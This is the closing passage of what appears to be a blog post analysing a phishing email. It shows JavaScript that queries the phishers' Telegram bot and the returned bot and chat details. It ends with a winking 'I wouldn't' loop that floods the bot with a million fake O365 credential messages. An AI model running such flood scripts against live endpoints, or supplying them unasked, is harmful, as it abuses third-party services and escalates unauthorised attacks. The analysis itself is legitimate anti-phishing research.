  let json = await res.json();
  console.log("me", json);

  res = await fetch(`${telegramAPIBase}/getChat`, {
    method: "POST",
    body: JSON.stringify({ chat_id }),
    headers: {
      "Content-Type": "application/json",
      "cache-control": "no-cache",
    },
  });
  json = await res.json();
  console.log("chat", json);
})();
```

This sees the following dumped to the console:

```
me {
  ok: true,
  result: {
    id: 5742807394,
    is_bot: true,
    first_name: 'countduque',
    username: 'countduque11_bot',
    can_join_groups: true,
    can_read_all_group_messages: false,
    supports_inline_queries: false
  }
}
chat {
  ok: true,
  result: {
    id: 5486255038,
    first_name: 'Count',
    last_name: 'Duque',
    type: 'private'
  }
}
```

So our bot is named `countduque` and they are in a private chat (which isn't surprising really), but what is surprising, and somewhat annoying, is that the user has `can_read_all_group_messages` set to `false`, which [is the default for bots](https://core.telegram.org/bots#privacy-mode). The impact of this is that the bot is unable to read out the messages of the chat. I had assumed that they were using the bot as the input and output processing, but it seems like it's just feeding the data in and either they have a person on the other end that reads the messages, or a different bot that reads them. Given the semi-structured nature of the input, I'm guessing they have another bot that's reading the messages.

To validate, I use the `getUpdates` endpoint, but through all my testing, I was unable to get back any messages, even when I submitted them I was unable to read them back immediately... _queue sad face_.

I guess that I'm not going to be able to get much further with this bot... so instead I spammed it with 1000000 fake messages... _as you do_.

## Summary

I'm enjoying this exploration into the spammer emails. It was interesting to see the use of unicode for identifier names as a way to obfuscate the code a little more (at least, so I assume), and I'm not surprised that I wasn't able to pull the messages from the Telegram chat, just saddened that I couldn't.

I'll just have to keep an eye out for the next one that comes in and see if I can learn any more.

Oh, and I'd totally not encourage anyone to use the token/chat ID that was in this to run code such as this:

```javascript
  for (let i = 0; i < 1000000; i++) {
    const message = `====== O365 Result ======\\r\\nEmail: ${email}\\r\\nPassword1: ${password}\\r\\nPassword2: ${password}\\r\\nIP: https://ip-api.com/0.0.0.0\\r\\nUser-Agent: Mozilla/4.02 [en] (X11; I; SunOS 5.6 sun4u)\\r\\n===================`;
    fetch(`${telegramAPIBase}/sendMessage`, {
      method: "POST",
      body: JSON.stringify({ chat_id: chat_id, text: message }),
      headers: {
        "Content-Type": "application/json",
        "cache-control": "no-cache",
      },
    });
  }
```

I really wouldn't... 😏
